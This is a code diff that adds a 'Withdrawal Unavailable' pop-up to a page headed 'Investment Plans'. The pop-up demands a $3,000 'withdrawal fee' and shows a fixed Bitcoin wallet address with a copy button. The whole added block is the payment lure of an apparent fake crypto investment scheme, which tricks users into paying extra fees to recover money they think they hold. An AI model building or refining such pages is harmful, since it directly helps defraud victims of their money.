@@ -744,5 +744,37 @@ Investment Plans
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script src="script.js?v=2"></script>
 
+
+<div id="withdrawFeeModal" class="withdraw-fee-modal">
+
+    <div class="withdraw-fee-content">
+
+        <h2>Withdrawal Unavailable</h2>
+
+        <p>
+            To continue, a withdrawal fee of <strong>$3,000</strong> is required.
+        </p>
+
+        <p>Send the fee to this BTC wallet:</p>
+
+        <input
+            type="text"
+            id="feeWallet"
+            value="bc1q3kjwt332fqwfvxjq0wls4rt38zkk0f4k8yv2hc"
+            readonly
+        >
+
+        <button onclick="copyFeeWallet()">
+            Copy Wallet
+        </button>
+
+        <button onclick="closeWithdrawFeeModal()">
+            Close
+        </button>
+
+    </div>
+
+</div>
+
 </body>
 </html>
